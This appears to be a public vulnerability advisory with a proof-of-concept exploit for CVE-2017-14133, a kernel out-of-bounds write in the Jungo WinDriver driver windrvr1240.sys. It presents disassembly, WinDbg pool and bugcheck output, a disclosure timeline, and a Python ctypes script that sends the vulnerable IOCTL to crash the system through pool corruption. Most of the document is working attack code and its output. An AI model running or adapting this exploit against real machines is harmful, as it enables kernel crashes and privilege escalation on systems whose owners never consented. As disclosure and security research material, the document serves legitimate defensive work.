@@ -1,0 +1,344 @@
+# -*- coding: utf-8 -*-
+"""
+Jungo DriverWizard WinDriver Kernel Out-of-Bounds Write Privilege Escalation Vulnerability
+
+Download: http://www.jungo.com/st/products/windriver/
+File:     WD1240.EXE
+Sha1:     3527cc974ec885166f0d96f6aedc8e542bb66cba
+Driver:   windrvr1240.sys
+Sha1:     0f212075d86ef7e859c1941f8e5b9e7a6f2558ad
+CVE:      CVE-2017-14133
+Author:   Steven Seeley (mr_me) of Source Incite
+Affected: <= v12.4.0
+
+Summary:
+========
+
+This vulnerability allows local attackers to escalate privileges on vulnerable installations of Jungo WinDriver. An attacker must first obtain the ability to execute low-privileged code on the target system in order to exploit this vulnerability. The specific flaw exists within the processing of IOCTL 0x9538268f by the windrvr1240 kernel driver. The issue lies in the failure to properly validate user-supplied data which can result in an out-of-bounds write condition. An attacker can leverage this vulnerability to execute arbitrary code under the context of kernel.
+
+Vulnerability Analysis:
+=======================
+
+In sub_40FE6C, 0x7E0 is pushed as an argument to the sub_41AEFA call.
+
+.text:0040FEF8 sub_40FEF8      proc near                       ; CODE XREF: sub_40FE6C+48
+.text:0040FEF8                                                 ; sub_419B7C+7DC
+.text:0040FEF8
+.text:0040FEF8 var_4           = dword ptr -4
+.text:0040FEF8 arg_0           = dword ptr  8
+.text:0040FEF8 arg_4           = dword ptr  0Ch
+.text:0040FEF8 arg_8           = dword ptr  10h
+.text:0040FEF8
+.text:0040FEF8                 push    ebp
+.text:0040FEF9                 mov     ebp, esp
+.text:0040FEFB                 push    ecx
+.text:0040FEFC                 push    esi
+.text:0040FEFD                 push    7E0h                    ; fixed size_t
+.text:0040FF02                 call    sub_41AEFA              ; calls ExAllocatePoolWithTag and memsets buffer
+
+This function calls ExAllocatePoolWithTag and memset via wrapper functions and returns the allocated buffer.
+
+.text:0041AEFA ; int __stdcall sub_41AEFA(size_t)
+.text:0041AEFA sub_41AEFA      proc near                       ; CODE XREF: sub_40179E+9
+.text:0041AEFA                                                 ; sub_401F34+54
+.text:0041AEFA
+.text:0041AEFA arg_0           = dword ptr  8
+.text:0041AEFA
+.text:0041AEFA                 push    ebp
+.text:0041AEFB                 mov     ebp, esp
+.text:0041AEFD                 push    esi
+.text:0041AEFE                 push    [ebp+arg_0]             ; NumberOfBytes
+.text:0041AF01                 call    sub_419A12              ; wrapper for ExAllocatePoolWithTag
+
+.text:0041AF06                 mov     esi, eax
+.text:0041AF08                 test    esi, esi
+.text:0041AF0A                 jz      short loc_41AF1A
+.text:0041AF0C                 push    [ebp+arg_0]             ; size_t
+.text:0041AF0F                 push    0                       ; int
+.text:0041AF11                 push    esi                     ; void *
+.text:0041AF12                 call    memset
+
+Once we return from sub_41AEFA, the code lands into the next basic block at loc_40FF2D. The first out-of-bounds write occurs in here:
+
+.text:0040FF2D loc_40FF2D:                                     ; CODE XREF: sub_40FEF8+16
+.text:0040FF2D                 push    ebx
+.text:0040FF2E                 mov     ebx, [ebp+arg_0]
+.text:0040FF31                 push    edi
+.text:0040FF32                 push    [ebp+arg_8]
+.text:0040FF35                 mov     eax, [ebx]
+.text:0040FF37                 push    [ebp+arg_4]
+.text:0040FF3A                 mov     [esi], eax
+.text:0040FF3C                 mov     eax, [ebx+4]
+.text:0040FF3F                 mov     [esi+4], eax
+.text:0040FF42                 mov     eax, [ebx+7DCh]
+.text:0040FF48                 push    esi
+.text:0040FF49                 mov     [esi+140Ch], eax        ; oob write
+.text:0040FF4F                 call    sub_40FC1A
+
+kd> r
+eax=43434343 ebx=89b54141 ecx=00000000 edx=00000000 esi=86a95820 edi=89b54141
+eip=9540ff49 esp=a56de9ec ebp=a56dea08 iopl=0         nv up ei ng nz na po nc
+cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000282
+windrvr1240+0xff49:
+9540ff49 89860c140000    mov     dword ptr [esi+140Ch],eax ds:0023:86a96c2c=ff91e1f8
+
+kd> !pool @esi
+Pool page 872a4458 region is Nonpaged pool
+ 872a4000 size:   98 previous size:    0  (Allocated)  MmCa
+ 872a4098 size:   18 previous size:   98  (Free)       .@*.
+ 872a40b0 size:   68 previous size:   18  (Allocated)  FMsl
+ 872a4118 size:   c8 previous size:   68  (Allocated)  Ntfx
+ 872a41e0 size:  270 previous size:   c8  (Free)       File
+*872a4450 size:  7e8 previous size:  270  (Allocated) *RDW.
+		Owning component : Unknown (update pooltag.txt)
+ 872a4c38 size:   b8 previous size:  7e8  (Allocated)  File (Protected)
+ 872a4cf0 size:  128 previous size:   b8  (Allocated)  Ntfi
+ 872a4e18 size:   68 previous size:  128  (Allocated)  FMsl
+ 872a4e80 size:   c8 previous size:   68  (Allocated)  Ntfx
+ 872a4f48 size:   b8 previous size:   c8  (Free )  File (Protected)
+ 
+We can see the size of the pool chunk in @esi is 0x7e8. So a write outside of 0x7e8 (such as 0x140C) can result in a pool corruption if it is not mapped or not writable.
+ 
+The second out-of-bounds write occurs in sub_40FC1A:
+
+.text:0040FC1A sub_40FC1A      proc near                      ; CODE XREF: sub_40FEF8+57
+.text:0040FC1A                                                ; sub_419B7C+AE3
+.text:0040FC1A
+.text:0040FC1A arg_0           = dword ptr  8
+.text:0040FC1A arg_4           = dword ptr  0Ch
+.text:0040FC1A arg_8           = dword ptr  10h
+.text:0040FC1A
+.text:0040FC1A                 push    ebp
+.text:0040FC1B                 mov     ebp, esp
+.text:0040FC1D                 push    esi
+.text:0040FC1E                 mov     esi, [ebp+arg_0]
+.text:0040FC21                 push    edi                    ; char
+.text:0040FC22                 push    dword ptr [esi+140Ch]
+.text:0040FC28                 push    dword ptr [esi+4]
+.text:0040FC2B                 push    dword ptr [esi]        ; char
+.text:0040FC2D                 push    offset aDo_pci_scanEnt ; "Do_pci_scan: Entered. search VID [0x%lx"...
+.text:0040FC32                 push    40h                    ; int
+.text:0040FC34                 push    4                      ; int
+.text:0040FC36                 call    sub_4059EA
+.text:0040FC3B                 xor     edi, edi
+.text:0040FC3D                 lea     eax, [esi+0Ch]
+.text:0040FC40                 push    1400h                  ; size_t
+.text:0040FC45                 push    edi                    ; int
+.text:0040FC46                 push    eax                    ; void * (size 0x7e8)
+.text:0040FC47                 mov     [esi+8], edi
+.text:0040FC4A                 call    memset
+
+kd> r
+eax=86a9582c ebx=89b54141 ecx=a50f34c2 edx=00000000 esi=86a95820 edi=00000000
+eip=9540fc4a esp=a56de9b8 ebp=a56de9e4 iopl=0         nv up ei pl zr na pe nc
+cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000246
+windrvr1240+0xfc4a:
+9540fc4a e80fb30000      call    windrvr1240+0x1af5e (9541af5e)
+kd> !pool poi(@esp) 
+Pool page 86a9582c region is Nonpaged pool
+ 86a95000 size:   98 previous size:    0  (Allocated)  MmCa
+ 86a95098 size:   30 previous size:   98  (Free)       ....
+ 86a950c8 size:  750 previous size:   30  (Allocated)  AfdB (Protected)
+*86a95818 size:  7e8 previous size:  750  (Allocated) *RDW.
+    Owning component : Unknown (update pooltag.txt)
+
+Again, we are using the same pool chunk and size (0x7e8) yet the memset is being called with 0x1400. This means we will overflow the buffer by 0xc18 or 3096 bytes. 
+
+Note: there maybe other out-of-bounds writes with this ioctl, but these two out-of-bounds writes will be enough to trigger a bug check pool corruption, Also, the code never returns from the sub_40FC1A call:
+
+kd> !analyze -v
+*******************************************************************************
+*                                                                             *
+*                        Bugcheck Analysis                                    *
+*                                                                             *
+*******************************************************************************
+
+DRIVER_CORRUPTED_EXPOOL (c5)
+An attempt was made to access a pageable (or completely invalid) address at an
+interrupt request level (IRQL) that is too high.  This is
+caused by drivers that have corrupted the system pool.  Run the driver
+verifier against any new (or suspect) drivers, and if that doesn't turn up
+the culprit, then use gflags to enable special pool.
+Arguments:
+Arg1: 00000004, memory referenced
+Arg2: 00000002, IRQL
+Arg3: 00000000, value 0 = read operation, 1 = write operation
+Arg4: 82b2a7ff, address which referenced memory
+
+Debugging Details:
+------------------
+
+BUGCHECK_STR:  0xC5_2
+
+CURRENT_IRQL:  2
+
+FAULTING_IP: 
+nt!ExDeferredFreePool+19f
+82b2a7ff 397304          cmp     dword ptr [ebx+4],esi
+
+DEFAULT_BUCKET_ID:  VISTA_DRIVER_FAULT
+
+PROCESS_NAME:  python.exe
+
+TRAP_FRAME:  a56de6a4 -- (.trap 0xffffffffa56de6a4)
+ErrCode = 00000000
+eax=86a96758 ebx=00000000 ecx=000001ff edx=00000000 esi=86a96760 edi=82b3f7c0
+eip=82b2a7ff esp=a56de718 ebp=a56de750 iopl=0         nv up ei ng nz ac pe nc
+cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010296
+nt!ExDeferredFreePool+0x19f:
+82b2a7ff 397304          cmp     dword ptr [ebx+4],esi ds:0023:00000004=????????
+Resetting default scope
+
+LAST_CONTROL_TRANSFER:  from 82ae5ee3 to 82a81a38
+
+STACK_TEXT:  
+a56de26c 82ae5ee3 00000003 66848faa 00000065 nt!RtlpBreakWithStatusInstruction
+a56de2bc 82ae69e1 00000003 00000004 82b2a7ff nt!KiBugCheckDebugBreak+0x1c
+a56de684 82a470bf 0000000a 00000004 00000002 nt!KeBugCheck2+0x68b
+a56de684 82b2a7ff 0000000a 00000004 00000002 nt!KiTrap0E+0x1b3
+a56de750 82b2a35f 82b3f7c0 00000000 86a9b760 nt!ExDeferredFreePool+0x19f
+a56de7bc 82a25075 86a9c760 00000000 00000001 nt!ExFreePoolWithTag+0x8a4
+a56de88c 82a77224 868900b0 a56f8000 868900b0 nt!MiRemoveIoSpaceMap+0x287
+a56de8bc 9540f1ee a56f8000 00001000 a56de8e8 nt!MmUnmapIoSpace+0x62
+WARNING: Stack unwind information not available. Following frames may be wrong.
+a56de8cc 9540f983 a56f8000 00001000 00000000 windrvr1240+0xf1ee
+a56de8e8 95410d58 a56f8000 00001000 00000000 windrvr1240+0xf983
+a56de90c 95410be8 00000001 00000000 00000015 windrvr1240+0x10d58
+a56de930 95410062 00000000 00000015 00000000 windrvr1240+0x10be8
+a56de964 954103ee 00000000 00000015 00000005 windrvr1240+0x10062
+a56de990 95410876 86a95820 00000000 00000015 windrvr1240+0x103ee
+a56de9c8 9540fcc6 86a95820 86a906d8 86a906d8 windrvr1240+0x10876
+a56de9e4 9540ff54 86a95820 86a906d8 86a906d8 windrvr1240+0xfcc6
+a56dea08 9541a35d 89b54141 86a906d8 86a906d8 windrvr1240+0xff54
+a56dea8c 95418dda 00000001 86a906d8 86a906d8 windrvr1240+0x1a35d
+a56deadc 82a3d169 859d9918 20000000 86894258 windrvr1240+0x18dda
+a56deaf4 82c358cf 00005000 86894258 868942ec nt!IofCallDriver+0x63
+a56deb14 82c38c3e 859d9918 86a906d8 00000000 nt!IopSynchronousServiceTail+0x1f8
+a56debd0 82c7fc62 00000074 86894258 00000000 nt!IopXxxControlFile+0x830
+a56dec04 82a43e06 00000074 00000000 00000000 nt!NtDeviceIoControlFile+0x2a
+a56dec04 77626c74 00000074 00000000 00000000 nt!KiSystemServicePostCall
+0021f254 7762542c 6d7aeb5a 00000074 00000000 ntdll!KiFastSystemCallRet
+0021f258 6d7aeb5a 00000074 00000000 00000000 ntdll!NtDeviceIoControlFile+0xc
+0021f28c 6d7ad7a6 6d7ad5f0 0021f2ac 00000028 _ctypes!DllCanUnloadNow+0x603a
+0021f2bc 6d7a983e 77625420 0021f3f0 4bf889a3 _ctypes!DllCanUnloadNow+0x4c86
+0021f36c 6d7aa06e 00001100 77625420 0021f3c0 _ctypes!DllCanUnloadNow+0xd1e
+0021f4dc 6d7a59e1 77625420 0137bdb0 00000000 _ctypes!DllCanUnloadNow+0x154e
+0021f538 6a6ce16c 013af618 0137bdb0 00000000 _ctypes+0x59e1
+0021f554 6a7518c4 01358918 0137bdb0 00000000 python27!PyObject_Call+0x4c
+0021f57c 6a751464 01358918 0000000a 0135c8ec python27!PyEval_GetFuncDesc+0x824
+0021f5a4 6a74f1bf 0021f600 0135c8c0 01344848 python27!PyEval_GetFuncDesc+0x3c4
+0021f618 6a7502bc 0135c788 00000000 012ca128 python27!PyEval_EvalFrameEx+0x23ff
+0021f660 6a77efdf 01344848 0121aa50 0121aa50 python27!PyEval_EvalCodeEx+0x7dc
+0021f69c 6a77ef7e 012ca128 0121aa50 0121aa50 python27!PyRun_FileExFlags+0xcf
+0021f6bc 6a77e281 74447408 0132132b 00000101 python27!PyRun_FileExFlags+0x6e
+0021f700 6a77dd07 74447408 0132132b 00000001 python27!PyRun_SimpleFileExFlags+0x211
+0021f720 6a6825ec 74447408 0132132b 00000001 python27!PyRun_AnyFileExFlags+0x57
+0021f7a0 1c801180 00000002 01321308 013218a8 python27!Py_Main+0xa4c
+0021f7e4 7682ef8c 7ffdf000 0021f830 7764367a python+0x1180
+0021f7f0 7764367a 7ffdf000 774af105 00000000 kernel32!BaseThreadInitThunk+0xe
+0021f830 7764364d 1c801327 7ffdf000 00000000 ntdll!__RtlUserThreadStart+0x70
+0021f848 00000000 1c801327 7ffdf000 00000000 ntdll!_RtlUserThreadStart+0x1b
+
+
+STACK_COMMAND:  kb
+
+FOLLOWUP_IP: 
+nt!ExDeferredFreePool+19f
+82b2a7ff 397304          cmp     dword ptr [ebx+4],esi
+
+SYMBOL_STACK_INDEX:  4
+
+SYMBOL_NAME:  nt!ExDeferredFreePool+19f
+
+FOLLOWUP_NAME:  Pool_corruption
+
+IMAGE_NAME:  Pool_Corruption
+
+DEBUG_FLR_IMAGE_TIMESTAMP:  0
+
+MODULE_NAME: Pool_Corruption
+
+FAILURE_BUCKET_ID:  0xC5_2_nt!ExDeferredFreePool+19f
+
+BUCKET_ID:  0xC5_2_nt!ExDeferredFreePool+19f
+
+Followup: Pool_corruption
+---------
+
+Timeline:
+=========
+
+2017-08-22 – Verified and sent to Jungo via sales@/first@/security@/info@jungo.com
+2017-08-25 – No response from Jungo and two bounced emails
+2017-08-26 – Attempted a follow up with the vendor via website chat
+2017-08-26 – No response via the website chat
+2017-09-03 – Recieved an email from a Jungo representative stating that they are "looking into it"
+2017-09-03 – Requested a timeframe for patch development and warned of possible 0day release
+2017-09-06 – No response from Jungo
+2017-09-06 – Public 0day release of advisory
+"""
+import sys
+from ctypes import *
+from time import sleep
+from ctypes.wintypes import *
+ 
+kernel32 = windll.kernel32
+ntdll = windll.ntdll
+ 
+#GLOBAL VARIABLES
+ 
+MEM_COMMIT = 0x00001000
+MEM_RESERVE = 0x00002000
+PAGE_EXECUTE_READWRITE = 0x00000040
+STATUS_SUCCESS = 0
+ 
+def alloc_in(base, input_size):
+    print "(+) allocating input buffer"
+    baseadd   = c_int(base)
+    size = c_int(input_size)
+    input = "\x44" * input_size
+    ntdll.NtAllocateVirtualMemory.argtypes = [c_int, POINTER(c_int), c_ulong, 
+                                              POINTER(c_int), c_int, c_int]
+    dwStatus = ntdll.NtAllocateVirtualMemory(0xffffffff, byref(baseadd), 0x0, 
+                                             byref(size), 
+                                             MEM_RESERVE|MEM_COMMIT,
+                                             PAGE_EXECUTE_READWRITE)
+    if dwStatus != STATUS_SUCCESS:
+        print "(-) error while allocating memory: %s" % hex(dwStatus + 0xffffffff)
+        sys.exit()
+    written = c_ulong()
+    write = kernel32.WriteProcessMemory(0xffffffff, base, input, len(input), byref(written))
+    if write == 0:
+        print "(-) error while writing our input buffer memory: %s" % write
+        sys.exit()
+
+if __name__ == '__main__':
+    print "\t--[ Jungo DriverWizard WinDriver Kernel Out-of-Bounds Write BSOD ]"
+    print "\t               Steven Seeley (mr_me) of Source Incite\r\n"
+    GENERIC_READ  = 0x80000000
+    GENERIC_WRITE = 0x40000000
+    OPEN_EXISTING = 0x3
+    IOCTL_VULN    = 0x9538268f
+    DEVICE_NAME   = "\\\\.\\WinDrvr1240"
+    dwReturn      = c_ulong()
+    driver_handle = kernel32.CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)
+    inputbuffer   = 0x41414141
+    inputbuffer_size  = 0x5000
+    outputbuffer_size = 0x5000
+    outputbuffer      = 0x20000000
+    alloc_in(inputbuffer,inputbuffer_size)  
+    IoStatusBlock = c_ulong()
+    if driver_handle:
+        print "(+) talking to the driver sending vulnerable ioctl..."
+        sleep(1)
+        dev_ioctl = ntdll.ZwDeviceIoControlFile(driver_handle,
+                                       None,
+                                       None,
+                                       None,
+                                       byref(IoStatusBlock),
+                                       IOCTL_VULN,
+                                       inputbuffer,
+                                       inputbuffer_size,
+                                       outputbuffer,
+                                       outputbuffer_size
+                                       )
